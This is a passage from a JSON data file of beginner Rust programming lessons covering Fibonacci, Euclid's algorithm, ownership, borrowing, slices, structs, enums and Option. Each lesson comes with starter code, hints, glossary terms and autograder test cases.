^0..5^ to ^0..10^. How many numbers print now? What is the last?\n\n## Your task\n\nWrite ^fib(n: u32) -> u64^ returning the n-th Fibonacci number. After looping n times, ^a^ holds the answer. Examples: ^fib(0)^ is ^0^, ^fib(10)^ is ^55^, ^fib(40)^ is ^102334155^. The tests go up to n = 90, so a naive recursive version would take far too long.","starter":"fn fib(n: u32) -> u64 {\n    todo!()\n}\n","hint":"Keep two variables a and b and loop n times, updating them.","terms":[{"term":"Fibonacci sequence","def":"0, 1, 1, 2, 3, 5, ... where each number is the sum of the previous two."},{"term":"loop","def":"Code that repeats several times."},{"term":"tuple","def":"A fixed-size group of values in parentheses, like (0, 1)."},{"term":"range","def":"Written 0..5; the numbers from 0 up to but not including 5."},{"term":"_","def":"A placeholder name meaning \"I do not need this value\"."},{"term":"for","def":"A loop that goes through each value of a range or collection."}],"image":{"url":"/diagrams/rust/fn-fibonacci.svg","caption":"Visual diagram: Fibonacci"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"fib 0","input":"0\n","expected":"0"},{"name":"fib 1","input":"1\n","expected":"1"},{"name":"fib 2","input":"2\n","expected":"1"},{"name":"fib 10","input":"10\n","expected":"55"},{"name":"fib 20","input":"20\n","expected":"6765"},{"name":"fib 40","input":"40\n","expected":"102334155"},{"name":"fib 90 (needs a loop)","input":"90\n","expected":"2880067194370816120"}],"usesInput":true,"hasHarness":true},{"id":"fn-gcd","number":"4.6","title":"Euclid's Algorithm","content":"## Greatest common divisor\n\nThe **greatest common divisor** (GCD) of two numbers is the biggest number that divides both with no remainder. For 12 and 18 it is 6. Think of cutting two ribbons into equal pieces as long as possible with nothing left over.\n\nAn **algorithm** is a step-by-step method for solving a problem. Euclid's algorithm, over 2000 years old, is recursive:\n\n- If ^b^ is ^0^, the answer is ^a^ (base case).\n- Otherwise the answer is the GCD of ^b^ and ^a % b^ (the **remainder**, what's left after dividing ^a^ by ^b^).\n\n~~~\nfn gcd(a: u64, b: u64) -> u64 {\n    if b == 0 {\n        a\n    } else {\n        gcd(b, a % b)\n    }\n}\n\nfn main() {\n    println!(\"{}\", gcd(12, 18));\n}\n~~~\n\n- ^if b == 0 { a }^ is the base case: nothing left to divide, so ^a^ is the answer.\n- ^gcd(b, a % b)^ is the recursive call with smaller numbers.\n- The chain is ^gcd(12, 18)^, then ^gcd(18, 12)^, then ^gcd(12, 6)^, then ^gcd(6, 0)^, which returns ^6^.\n\nOutput:\n\n~~~\n6\n~~~\n\n## Try it\n\nReplace ^gcd(12, 18)^ with ^gcd(17, 5)^. Two numbers with GCD 1 are called **coprime**: they share no factor.\n\n## Your task\n\nWrite ^gcd(a: u64, b: u64) -> u64^. Examples: ^gcd(100, 75)^ is ^25^, ^gcd(7, 0)^ is ^7^, ^gcd(0, 9)^ is ^9^.","starter":"fn gcd(a: u64, b: u64) -> u64 {\n    todo!()\n}\n","hint":"if b == 0 { a } else { gcd(b, a % b) }","terms":[{"term":"greatest common divisor","def":"The largest number that divides both given numbers with no remainder."},{"term":"algorithm","def":"A step-by-step method for solving a problem."},{"term":"remainder","def":"What is left over after division; written with %."},{"term":"recursive call","def":"A function calling itself with a smaller problem."},{"term":"coprime","def":"Two numbers whose greatest common divisor is 1."}],"image":{"url":"/diagrams/rust/fn-gcd.svg","caption":"Visual diagram: Euclid's Algorithm"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"common factor","input":"12 18\n","expected":"6"},{"name":"coprime","input":"17 5\n","expected":"1"},{"name":"multiple","input":"100 75\n","expected":"25"},{"name":"b is zero","input":"7 0\n","expected":"7"},{"name":"a is zero","input":"0 9\n","expected":"9"},{"name":"both zero","input":"0 0\n","expected":"0"},{"name":"classic","input":"1071 462\n","expected":"21"},{"name":"large primes","input":"1000000007 998244353\n","expected":"1"}],"usesInput":true,"hasHarness":true}]},{"id":"ownership","title":"Ownership & Borrowing","lessons":[{"id":"own-move-clone","number":"5.1","title":"Moves and Clones","content":"## One value, one owner\n\nEvery program stores information in the computer's **memory** - the working space where a running program keeps its data. Rust has a special way of managing memory called **ownership**. Think of a library book: at any moment the book has exactly one person who has checked it out. That person is the **owner**. If the owner hands the book to a friend, the owner no longer has it.\n\nRust has three rules:\n\n- Each value has exactly one **owner** (the variable that holds it).\n- When the owner goes out of **scope** (the region of code between ^{^ and ^}^ where a variable exists), the value is thrown away. Rust calls that being **dropped**: its memory is given back automatically.\n- Handing a value to another variable **moves** it: the new variable becomes the owner and the old variable can no longer be used.\n\nText that can grow, like a ^String^, lives in the **heap** - a big shared storage area for data whose size can change while the program runs. Small fixed-size values such as numbers live on the **stack** - a tidy, fast pile of small values that is cleaned up automatically when a block ends. A ^String^ keeps a small label on the stack that points to its letters on the heap, so copying it carelessly would give two owners for one pile of letters. That is why Rust moves it instead.\n\n## Example: a move\n\n~~~\nfn main() {\n    let a = String::from(\"hi\");\n    let b = a;\n    println!(\"{}\", b);\n}\n~~~\n\n- ^let a = String::from(\"hi\");^ creates a ^String^ (growable text) and makes ^a^ its owner.\n- ^let b = a;^ moves the text from ^a^ to ^b^. Now ^b^ is the owner and ^a^ is unusable.\n- ^println!(\"{}\", b);^ prints the text. We used ^b^, the current owner.\n\nOutput:\n\n~~~\nhi\n~~~\n\nIf we printed ^a^ after the move, the **compiler** (the tool that checks and translates your program before it runs) would refuse with an error like:\n\n~~~\nerror[E0382]: borrow of moved value: a\n  value moved here, in previous assignment: let b = a;\n  value borrowed here after move: println!(\"{}\", a);\n~~~\n\nIt means: \"you gave the book away, then tried to read it\". The error appears before the program ever runs, which protects you from bugs.\n\n## Clone and Copy\n\nIf you want a second, independent book, photocopy it. In Rust, ^.clone()^ makes a full duplicate of the value, so both variables own their own copy. Simple values such as whole numbers are **Copy** types: they are tiny, so Rust copies them automatically and never moves them.\n\n~~~\nfn main() {\n    let a = String::from(\"hi\");\n    let b = a.clone();\n    let n = 5;\n    let m = n;\n    println!(\"{} {} {} {}\", a, b, n, m);\n}\n~~~\n\n- ^a.clone()^ builds a duplicate of the text, so ^a^ keeps its own.\n- ^let m = n;^ copies the number, so ^n^ still works.\n- The ^println!^ prints all four values separated by spaces.\n\nOutput:\n\n~~~\nhi hi 5 5\n~~~\n\n## Try it\n\nIn the example above, change ^a.clone()^ to just ^a^ and press Run. Read the error message: it says ^a^ was moved. Then change it back.\n\n## Your task\n\nThis program doesn't compile because ^s1^ is moved into ^s2^ and then used. Fix it with ^.clone()^ (keep both values in the ^println!^) so it prints:\n\n~~~\nhello hello\n~~~","starter":"fn main() {\n    let s1 = String::from(\"hello\");\n    let s2 = s1;\n    println!(\"{} {}\", s1, s2);\n}\n","hint":"let s2 = s1.clone();","terms":[{"term":"memory","def":"The working space where a running program keeps its data."},{"term":"owner","def":"The one variable responsible for a value; when it goes out of scope the value is dropped."},{"term":"move","def":"Handing a value to another variable so the old variable can no longer be used."},{"term":"clone","def":".clone() makes a full independent duplicate of a value."},{"term":"Copy","def":"Small types like numbers that are duplicated automatically instead of moved."},{"term":"heap / stack","def":"Heap: shared storage for growable data. Stack: fast pile for small fixed-size values."},{"term":"scope / drop","def":"Scope is where a variable exists; drop is Rust cleaning up a value when its owner leaves scope."}],"image":{"url":"/diagrams/rust/own-move-clone.svg","caption":"Visual diagram: Moves and Clones"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"prints both copies","input":"","expected":"hello hello"}],"usesInput":false,"hasHarness":false},{"id":"own-borrow","number":"5.2","title":"References","content":"## Lending instead of giving\n\nMoving a value into a function gives it away for good. Usually you only want to *lend* it, like letting a friend read your library book and return it. In Rust, lending is called **borrowing**, and you do it with a **reference**: a pointer to a value that lets you look at it without owning it. You make one by writing ^&^ in front of a variable. The owner keeps ownership, and the value is not dropped when the borrower is done.\n\nA function's **parameter** is a named input slot, written like ^s: &String^ (name, colon, type). The type ^&String^ means \"a borrowed String\".\n\n## Example\n\n~~~\nfn show(s: &String) {\n    println!(\"{}\", s);\n}\n\nfn main() {\n    let name = String::from(\"Ada\");\n    show(&name);\n    show(&name);\n}\n~~~\n\n- ^fn show(s: &String)^ defines a function that borrows a ^String^ and does not take it.\n- ^println!(\"{}\", s);^ prints the borrowed text.\n- ^let name = ...^ makes ^name^ the owner.\n- ^show(&name);^ lends ^name^ out. When ^show^ ends, the loan ends.\n- The second ^show(&name)^ works because ^name^ was never given away.\n\nOutput:\n\n~~~\nAda\nAda\n~~~\n\nIf ^show^ took ^String^ (no ^&^), the second call would fail with ^error[E0382]: borrow of moved value: name^.\n\n## Try it\n\nRemove the ^&^ from the first ^show(&name)^ call and Run. Read the error (mismatched types: expected ^&String^, found ^String^), then undo it.\n\n## Your task\n\n^calc_length^ takes ownership of its argument, so the caller can't use the string afterwards. Change it to borrow a ^&String^ instead. The autograder calls ^calc_length(&s)^ on each input line and prints the text with its length, for example:\n\n~~~\n\"Learn4Free\" -> 10\n~~~","starter":"fn calc_length(s: String) -> usize {\n    s.len()\n}\n","hint":"Change the parameter type to &String.","terms":[{"term":"borrow","def":"Temporarily use a value without taking ownership of it."},{"term":"reference","def":"A pointer to a value that lets you use it without owning it."},{"term":"&","def":"Makes a reference when written before a value, and marks a reference in a type."},{"term":"parameter","def":"A named input slot of a function, with a type."},{"term":".len()","def":"Returns how many bytes of text a String holds."}],"image":{"url":"/diagrams/rust/own-borrow.svg","caption":"Visual diagram: References"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"one word","input":"Learn4Free\n","expected":"\"Learn4Free\" -> 10"},{"name":"empty line","input":"\n","expected":"\"\" -> 0"},{"name":"with spaces","input":"hello world\n","expected":"\"hello world\" -> 11"},{"name":"several lines","input":"a\nabc\n\nRust\n","expected":"\"a\" -> 1\n\"abc\" -> 3\n\"\" -> 0\n\"Rust\" -> 4"}],"usesInput":true,"hasHarness":true},{"id":"own-mut-ref","number":"5.3","title":"Mutable References","content":"## Lending a book you may write in\n\nA plain reference ^&^ is read-only, like lending a book with \"no highlighting\". A **mutable reference** is written ^&mut^ and allows the borrower to change the value. (**Mutable** means \"changeable\".) The variable must itself be declared ^let mut^ so Rust knows it may change.\n\nInside the function, ^*n^ means \"the value that ^n^ points to\". The ^*^ is called **dereferencing**: following the pointer to reach the real value.\n\nThe safety rule: at one moment you can have **either** any number of read-only ^&^ borrows **or** exactly one ^&mut^ borrow, never both. Imagine one person editing a shared document while others try to read it halfway through: confusing! Rust forbids it before the program runs.\n\n## Example\n\n~~~\nfn add_one(n: &mut i32) {\n    *n += 1;\n}\n\nfn main() {\n    let mut x = 1;\n    add_one(&mut x);\n    add_one(&mut x);\n    println!(\"{}\", x);\n}\n~~~\n\n- ^n: &mut i32^ is a parameter holding a changeable borrow of a whole number.\n- ^*n += 1;^ follows the pointer and adds 1 to the real number.\n- ^let mut x = 1;^ creates a changeable variable.\n- ^add_one(&mut x);^ lends ^x^ out for editing. This happens twice.\n- ^println!^ prints the final value.\n\nOutput:\n\n~~~\n3\n~~~\n\nForgetting ^mut^ gives: ^error[E0596]: cannot borrow x as mutable, as it is not declared as mutable^. Two ^&mut^ at once gives: ^error[E0499]: cannot borrow x as mutable more than once at a time^.\n\n## Try it\n\nDelete the word ^mut^ from ^let mut x = 1;^ and Run to see the E0596 error. Undo it afterwards.\n\n## Your task\n\nWrite ^add_exclaim^ which appends a ^!^ to the end of a ^String^. Use ^s.push('!')^, which adds one character to a ^String^. Example: calling it twice on ^Hi^ gives ^Hi!!^. The autograder calls it twice on each input line:\n\n~~~\nHi!!\n~~~","starter":"fn add_exclaim(s: &mut String) {\n    // TODO\n}\n","hint":"s.push('!') adds one char.","terms":[{"term":"&mut","def":"A changeable borrow: lets the borrower modify the value."},{"term":"mut","def":"Marks a variable as changeable."},{"term":"*","def":"Dereference: follow a reference to the real value."},{"term":"mutable","def":"Able to be changed."},{"term":".push(c)","def":"Adds one character to the end of a String."},{"term":"borrowing rule","def":"Either many read-only borrows or one mutable borrow, never both at once."}],"image":{"url":"/diagrams/rust/own-mut-ref.svg","caption":"Visual diagram: Mutable References"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"simple word","input":"Hi\n","expected":"Hi!!"},{"name":"empty string","input":"\n","expected":"!!"},{"name":"sentence","input":"Hello there\n","expected":"Hello there!!"},{"name":"several lines","input":"a\nb c\n\n","expected":"a!!\nb c!!\n!!"}],"usesInput":true,"hasHarness":true},{"id":"own-slices","number":"5.4","title":"Slices","content":"## Borrowing part of a value\n\nSometimes you want to borrow only a piece of some text. A **slice** is a reference to a contiguous (unbroken) part of a collection. For text, the slice type is ^&str^ (read \"string slice\"). Picture a bookmark and a highlighter: the slice doesn't copy the words, it just points at a stretch of the original.\n\nYou write a slice with a **range**: ^[start..end]^ means \"from position start up to, but not including, end\". Positions count from 0. ^[..3]^ starts at the beginning and ^[6..]^ goes to the end. String literals like ^\"hello\"^ are already ^&str^, and ^&str^ parameters accept both ^&String^ and literals, so prefer ^&str^.\n\nUseful: ^s.find(' ')^ searches for a space and returns an **Option** - a value that is either ^Some(position)^ (found) or ^None^ (not found). A ^match^ chooses what to do for each case.\n\n## Example\n\n~~~\nfn main() {\n    let s = String::from(\"hello world\");\n    let hello = &s[0..5];\n    let world = &s[6..];\n    println!(\"{}|{}\", hello, world);\n}\n~~~\n\n- ^&s[0..5]^ borrows positions 0,1,2,3,4: the letters ^hello^.\n- ^&s[6..]^ borrows from position 6 to the end: ^world^ (position 5 is the space).\n- ^println!^ prints both slices with a ^|^ between them.\n\nOutput:\n\n~~~\nhello|world\n~~~\n\nThe compiler protects slices too: if you tried to clear ^s^ while ^hello^ was still in use, you'd get ^error[E0502]: cannot borrow s as mutable because it is also borrowed as immutable^ (immutable means \"not changeable\", like a plain ^&^).\n\n## Try it\n\nChange ^&s[0..5]^ to ^&s[0..3]^ and Run: it prints ^hel|world^.\n\n## Your task\n\nWrite ^first_word^ returning the first word of the text (everything before the first space), or the whole text if there is no space. The autograder prints each result inside square brackets:\n\n~~~\n[Rust]\n~~~\nfor the input ^Rust is great^.","starter":"fn first_word(s: &str) -> &str {\n    todo!()\n}\n","hint":"match s.find(' ') { Some(i) => &s[..i], None => s }","terms":[{"term":"slice","def":"A reference to a contiguous part of a collection, without copying it."},{"term":"&str","def":"The string slice type; string literals have this type."},{"term":"range","def":"start..end means from start up to but not including end."},{"term":"Option","def":"A value that is either Some(thing) or None."},{"term":".find(c)","def":"Searches text and returns Some(position) or None."},{"term":"match","def":"Picks code to run depending on which pattern a value fits."}],"image":{"url":"/diagrams/rust/own-slices.svg","caption":"Visual diagram: Slices"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"several words","input":"Rust is great\n","expected":"[Rust]"},{"name":"single word","input":"Ferris\n","expected":"[Ferris]"},{"name":"empty string","input":"\n","expected":"[]"},{"name":"two words","input":"a b\n","expected":"[a]"},{"name":"many lines","input":"one two\nthree\n\nfour five six\n","expected":"[one]\n[three]\n[]\n[four]"}],"usesInput":true,"hasHarness":true},{"id":"own-return","number":"5.5","title":"Taking and Returning Ownership","content":"## Passing the book through\n\nWhen a function takes a value by value (no ^&^), it becomes the new owner, like a friend you gave the book to. When the function finishes, the book would be dropped. But the function can hand ownership back by **returning** the value: sending a result back to whoever called the function. The function's **return type** is written after ^->^.\n\nThe last line of a function without a semicolon is its **return value**. That's how ^s^ below is returned.\n\n## Example\n\n~~~\nfn append_world(mut s: String) -> String {\n    s.push_str(\" world\");\n    s\n}\n\nfn main() {\n    let a = String::from(\"hello\");\n    let b = append_world(a);\n    println!(\"{}\", b);\n}\n~~~\n\n- ^mut s: String^ means the function owns ^s^ and may change it.\n- ^s.push_str(\" world\")^ adds a whole piece of text (^push^ adds one character; ^push_str^ adds a string).\n- The final ^s^ (no semicolon) returns ownership to the caller.\n- ^let b = append_world(a);^ moves ^a^ in and receives the result as ^b^. ^a^ can no longer be used.\n\nOutput:\n\n~~~\nhello world\n~~~\n\nPrinting ^a^ at the end would give ^error[E0382]: borrow of moved value: a^, since ^a^ was given away.\n\n## Try it\n\nAdd a semicolon after the last ^s^ in ^append_world^ and Run. The compiler complains about mismatched types because the function now returns nothing. Remove it again.\n\n## Your task\n\nWrite ^shout(s: String) -> String^ that returns the text in uppercase followed by ^!^. ^s.to_uppercase()^ makes a new ^String^ in capitals. The autograder prints the result per input line:\n\n~~~\nRUST!\n~~~\nfor the input ^rust^.","starter":"fn shout(s: String) -> String {\n    todo!()\n}\n","hint":"let mut up = s.to_uppercase(); up.push('!'); up","terms":[{"term":"return value","def":"The result a function hands back to its caller."},{"term":"->","def":"Written before a function's return type."},{"term":"ownership transfer","def":"Passing a value by value moves ownership into the function."},{"term":".to_uppercase()","def":"Makes a new String with all letters in capitals."},{"term":".push_str(s)","def":"Adds a piece of text to the end of a String."}],"image":{"url":"/diagrams/rust/own-return.svg","caption":"Visual diagram: Taking and Returning Ownership"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"lowercase word","input":"rust\n","expected":"RUST!"},{"name":"mixed with digits","input":"Learn4Free\n","expected":"LEARN4FREE!"},{"name":"empty string","input":"\n","expected":"!"},{"name":"sentence","input":"hello world\n","expected":"HELLO WORLD!"},{"name":"many lines","input":"a\nBc\n","expected":"A!\nBC!"}],"usesInput":true,"hasHarness":true}]},{"id":"structs-enums","title":"Structs & Enums","lessons":[{"id":"struct-rect","number":"6.1","title":"Structs & Methods","content":"## Bundling values into a struct\n\nSo far each value you stored lived in its own variable. Real things have several parts: a point on a map has an x and a y. A **struct** (short for \"structure\") is a custom type you design that bundles several related values together, like a paper form with labelled boxes. Each labelled box is called a **field**: it has a name and a type. A concrete filled-in form is an **instance** of the struct.\n\n~~~\nstruct Point {\n    x: i32,\n    y: i32,\n}\n\nfn main() {\n    let p = Point { x: 3, y: 4 };\n    println!(\"x is {}, y is {}\", p.x, p.y);\n}\n~~~\n\n- ^struct Point { ... }^ defines a new type named ^Point^ (the form template). Type names start with a capital letter by convention.\n- ^x: i32,^ and ^y: i32,^ declare two fields. Each says \"a field called this holds a whole number of this type\".\n- ^let p = Point { x: 3, y: 4 };^ makes an instance: you fill in every field by name.\n- ^p.x^ and ^p.y^ use **dot syntax**: a dot after the variable name, then the field name, reads that field.\n- ^println!^ prints the two values into the ^{}^ slots.\n\nOutput:\n\n~~~\nx is 3, y is 4\n~~~\n\n## Giving a struct behaviour: methods\n\nAn **impl block** (short for \"implementation\") is where you attach functions to a type: ^impl Point { ... }^ means \"here is what a Point can do\". Two kinds of function live inside:\n\n- A **method** is a function that works on one particular instance and is called with a dot, like ^p.dist_sq()^. Its first parameter is ^&self^. **self** is a name for \"the instance this method was called on\". The ^&^ means it only **borrows** (looks at) the instance without taking it away from you.\n- An **associated function** belongs to the type itself and has no ^self^. You call it with ^::^, like ^Point::new(3, 4)^. It is often used as a **constructor**, a function that builds a new instance.\n\n~~~\nstruct Point {\n    x: i32,\n    y: i32,\n}\n\nimpl Point {\n    fn new(x: i32, y: i32) -> Point {\n        Point { x, y }\n    }\n    fn dist_sq(&self) -> i32 {\n        self.x * self.x + self.y * self.y\n    }\n}\n\nfn main() {\n    let p = Point::new(3, 4);\n    println!(\"{}\", p.dist_sq());\n}\n~~~\n\n- ^impl Point {^ opens the impl block for ^Point^.\n- ^fn new(x: i32, y: i32) -> Point^ is an associated function (no ^self^) that returns a ^Point^.\n- ^Point { x, y }^ is shorthand for ^Point { x: x, y: y }^ when the variable names match the field names. It has no semicolon, so it is the returned value.\n- ^fn dist_sq(&self) -> i32^ is a method: it receives the instance as ^self^.\n- ^self.x * self.x + self.y * self.y^ reads the instance's fields and returns x squared plus y squared.\n- In ^main^, ^Point::new(3, 4)^ calls the associated function with ^::^, and ^p.dist_sq()^ calls the method with a dot.\n\nOutput:\n\n~~~\n25\n~~~\n\n## Try it\n\nIn the editor, change ^Point::new(3, 4)^ to ^Point::new(6, 8)^ in your own scratch code and predict the answer before running: it should be 100.\n\n## Your task\n\nFill in the three functions of ^Rectangle^ (already declared with ^width^ and ^height^ fields, both ^u32^, which is a whole number that cannot be negative):\n\n- ^square(size)^: an associated function returning a ^Rectangle^ whose width and height both equal ^size^.\n- ^area(&self)^: width times height.\n- ^perimeter(&self)^: 2 times (width plus height).\n\nFor a 3 by 4 rectangle: area is 12 and perimeter is 14. ^Rectangle::square(5)^ has area 25 and perimeter 20. Replace each ^todo!()^ (a placeholder that crashes the program if it runs) with real code.","starter":"struct Rectangle {\n    width: u32,\n    height: u32,\n}\n\nimpl Rectangle {\n    fn square(size: u32) -> Rectangle {\n        todo!()\n    }\n    fn area(&self) -> u32 {\n        todo!()\n    }\n    fn perimeter(&self) -> u32 {\n        todo!()\n    }\n}\n","hint":"Rectangle { width: size, height: size }","terms":[{"term":"struct","def":"A custom type that bundles several named values together."},{"term":"field","def":"One named, typed slot inside a struct."},{"term":"instance","def":"One concrete value made from a struct, with every field filled in."},{"term":"impl block","def":"A block (impl Type { ... }) that holds the functions belonging to a type."},{"term":"method","def":"A function inside an impl block that takes self and is called with dot syntax."},{"term":"self","def":"The name for the instance a method was called on; &self borrows it."},{"term":"associated function","def":"A function inside an impl block with no self, called with Type::name()."},{"term":"::","def":"The path separator, used to reach something that belongs to a type, such as Point::new."}],"image":{"url":"/diagrams/rust/struct-rect.svg","caption":"Visual diagram: Structs & Methods"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"3 by 4 and square 3","input":"3 4\n","expected":"12 14 9 12"},{"name":"square(5) via 5 by 2","input":"5 2\n","expected":"10 14 25 20"},{"name":"zero width","input":"0 5\n","expected":"0 10 0 0"},{"name":"already a square","input":"7 7\n","expected":"49 28 49 28"},{"name":"several rectangles","input":"1 1\n10 3\n","expected":"1 4 1 4\n30 26 100 40"}],"usesInput":true,"hasHarness":true},{"id":"enum-match","number":"6.2","title":"Enums & match","content":"## Enums: one value, several possible shapes\n\nA struct says \"I have this AND this AND this\". An **enum** (short for \"enumeration\") says \"I am exactly ONE of these choices\". Think of a traffic light: it is red, yellow or green, never two at once. Each choice is called a **variant**. A variant can also carry its own extra data, and different variants can carry different data.\n\n~~~\nenum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n}\n\nfn main() {\n    let msg = Message::Write(String::from(\"hello\"));\n    match msg {\n        Message::Quit => println!(\"quit\"),\n        Message::Move { x, y } => println!(\"move to {} {}\", x, y),\n        Message::Write(text) => println!(\"say {}\", text),\n    }\n}\n~~~\n\n- ^enum Message { ... }^ defines a type with three variants.\n- ^Quit,^ is a variant with no data.\n- ^Move { x: i32, y: i32 },^ is a variant with named fields, like a tiny struct.\n- ^Write(String),^ is a variant holding one unnamed value (a **tuple variant**, a variant whose data sits in parentheses).\n- ^Message::Write(String::from(\"hello\"))^ builds a value; you name the variant with ^::^.\n- ^match msg { ... }^ is **pattern matching**: Rust compares the value against each **pattern** (a shape to look for) from top to bottom and runs the code after ^=>^ for the first one that fits. Each pattern-plus-code pair is called an **arm**.\n- In ^Message::Write(text)^ the pattern also pulls the stored string out into a new variable called ^text^.\n- ^match^ must cover every variant, otherwise the program will not compile. That is how Rust stops you forgetting a case.\n\nOutput:\n\n~~~\nsay hello\n~~~\n\n## Try it\n\nIn your scratch code change the value to ^Message::Move { x: 1, y: 2 }^ and run. You should see ^move to 1 2^. Then delete the ^Quit^ arm and read the compiler error about a missing pattern.\n\n## Your task\n\nThe ^Shape^ enum has three variants: ^Circle(f64)^ holds the radius, ^Square(f64)^ holds the side, and ^Triangle { base, height }^ holds two numbers (^f64^ is a decimal number). Write ^area(shape: &Shape) -> f64^ using ^match^:\n\n- Circle: pi times radius times radius. Use ^std::f64::consts::PI^ for pi.\n- Square: side times side.\n- Triangle: 0.5 times base times height.\n\nA circle of radius 1.0 has area 3.14 (when printed with two decimals), a square of side 2.0 has 4.00, and a triangle with base 3.0 and height 4.0 has 6.00.","starter":"enum Shape {\n    Circle(f64),                        // radius\n    Square(f64),                        // side\n    Triangle { base: f64, height: f64 },\n}\n\nfn area(shape: &Shape) -> f64 {\n    todo!()\n}\n","hint":"Shape::Circle(r) => std::f64::consts::PI * r * r,","terms":[{"term":"enum","def":"A type whose value is exactly one of several named choices."},{"term":"variant","def":"One of the choices of an enum, optionally carrying data."},{"term":"match","def":"An expression that compares a value against patterns and runs the first arm that fits."},{"term":"pattern matching","def":"Checking a value against shapes (patterns) and pulling data out of it."},{"term":"arm","def":"One pattern => code pair inside a match."},{"term":"=>","def":"Separates a pattern from the code to run in a match arm."},{"term":"f64","def":"The standard decimal (floating-point) number type."}],"image":{"url":"/diagrams/rust/enum-match.svg","caption":"Visual diagram: Enums & match"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"unit circle","input":"circle 1\n","expected":"3.14"},{"name":"square","input":"square 2\n","expected":"4.00"},{"name":"triangle","input":"triangle 3 4\n","expected":"6.00"},{"name":"bigger circle","input":"circle 2.5\n","expected":"19.63"},{"name":"zero-size shapes","input":"circle 0\nsquare 0\ntriangle 0 9\n","expected":"0.00\n0.00\n0.00"},{"name":"all together","input":"circle 1\nsquare 2\ntriangle 3 4\ncircle 2.5\n","expected":"3.14\n4.00\n6.00\n19.63"}],"usesInput":true,"hasHarness":true},{"id":"enum-option","number":"6.3","title":"Option","content":"## Values that might be missing\n\nSometimes a question has no answer: \"Where is the number 99 in this list?\" when 99 is not there. Many languages use a special \"null\" value for that, which causes famous crashes when forgotten. Rust has no null. Instead it has a built-in enum called **Option**. An ^Option<T>^ (the ^T^ stands for \"whatever type is inside\", written in angle brackets) has exactly two variants:\n\n- **Some(value)**: there is an answer, and here it is.\n- **None**: there is no answer.\n\nThink of a gift box that is either holding a gift or is empty. The compiler makes you open the box and handle both cases before you can use what is inside.\n\n~~~\nfn half(n: i32) -> Option<i32> {\n    if n % 2 == 0 {\n        Some(n / 2)\n    } else {\n        None\n    }\n}\n\nfn main() {\n    println!(\"{:?}\", half(10));\n    println!(\"{:?}\", half(7));\n    if let Some(h) = half(10) {\n        println!(\"half is {}\", h);\n    }\n}\n~~~\n\n- ^fn half(n: i32) -> Option<i32>^ promises to return either ^Some^ number or ^None^.\n- ^n % 2 == 0^ asks \"is n even?\" (^%^ gives the remainder after dividing).\n- ^Some(n / 2)^ wraps the answer in the Some variant.\n- ^None^ means \"no answer\" (odd numbers cannot be halved evenly).\n- ^{:?}^ is the **Debug** format: a developer-friendly way to print values like enums. ^{}^ would not work here because Option has no plain display form.\n- ^if let Some(h) = half(10)^ is a short form of ^match^: \"if the value fits the pattern Some(h), put the inside into h and run the block; otherwise skip it\".\n\nOutput:\n\n~~~\nSome(5)\nNone\nhalf is 5\n~~~\n\n## Try it\n\nIn your scratch code call ^half(0)^ and ^half(-4)^ with ^{:?}^. Zero is even, so you should see ^Some(0)^ and ^Some(-2)^.\n\n## Your task\n\nWrite ^find_index(items: &[i32], target: i32) -> Option<usize>^. ^&[i32]^ is a **slice**, a borrowed view of a list of numbers, and ^usize^ is the whole-number type used for positions. Return ^Some(position)^ of the **first** item equal to ^target^ (positions start at 0), or ^None^ if it is not found.\n\n- ^find_index(&[5, 8, 13, 8], 13)^ gives ^Some(2)^\n- ^find_index(&[5, 8, 13, 8], 8)^ gives ^Some(1)^ (the first match)\n- ^find_index(&[5, 8, 13], 99)^ gives ^None^\n- an empty list gives ^None^\n\nHint: ^for (i, &x) in items.iter().enumerate()^ gives you each position ^i^ together with its value ^x^.","starter":"fn find_index(items: &[i32], target: i32) -> Option<usize> {\n    todo!()\n}\n","hint":"for (i, &x) in items.iter().enumerate() { ... }","terms":[{"term":"Option","def":"A built-in enum meaning \"maybe a value\": either Some(value) or None."},{"term":"Some","def":"The Option variant that holds a real value."},{"term":"None","def":"The Option variant meaning there is no value."},{"term":"<T>","def":"Angle brackets name a type placed inside another type, like the i32 in Option<i32>."},{"term":"if let","def":"A short match that runs a block only when a value fits one pattern."},{"term":"Debug ({:?})","def":"A print format that shows values such as enums for programmers."},{"term":"slice (&[T])","def":"A borrowed view of a list of values."},{"term":"usize","def":"The whole-number type used for positions and sizes."}],"image":{"url":"/diagrams/rust/enum-option.svg","caption":"Visual diagram: Option"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"found once","input":"13\n5 8 13 8\n","expected":"Some(2)"},{"name":"first of duplicates","input":"8\n5 8 13 8\n","expected":"Some(1)"},{"name":"missing","input":"99\n5 8 13\n","expected":"None"},{"name":"empty list","input":"1\n\n","expected":"None"},{"name":"at index zero","input":"5\n5 8 13\n","expected":"Some(0)"},{"name":"last item and negatives","input":"-3\n4 -1 -3\n","expected":"Some(2)"}],"usesInput":true,"hasHarness":true},{"id":"enum-direction","number":"6.4","title":"Enum Methods","content":"## Methods on enums\n\nEnums can have an impl block and methods, just like structs. Inside a method, ^self^ is the enum value the method was called on, and you usually ^match^ on it to decide what to do.\n\nTo print an enum value you must opt in. **derive** is an instruction placed above a type, written ^#[derive(Debug)]^ (an **attribute**: a note to the compiler wrapped in ^#[ ]^). It asks the compiler to write the boilerplate code for you automatically. Deriving **Debug** lets you print the value with ^{:?}^, which shows the variant's name.\n\n~~~\n#[derive(Debug)]\nenum Light {\n    Red,\n    Green,\n    Yellow,\n}\n\nimpl Light {\n    fn next(&self) -> Light {\n        match self {\n            Light::Red => Light::Green,\n            Light::Green => Light::Yellow,\n            Light::Yellow => Light::Red,\n        }\n    }\n}\n\nfn main() {\n    let mut light = Light::Red;\n    for _ in 0..4 {\n        print!(\"{:?} \", light);\n        light = light.next();\n    }\n    println!();\n}\n~~~\n\n- ^#[derive(Debug)]^ makes ^{:?}^ printing work for ^Light^.\n- ^impl Light { ... }^ attaches methods to the enum.\n- ^fn next(&self) -> Light^ borrows the current light and returns a new ^Light^.\n- ^match self^ checks which variant we have; each arm returns the following variant.\n- ^let mut light^ makes a variable that is allowed to change (^mut^ means 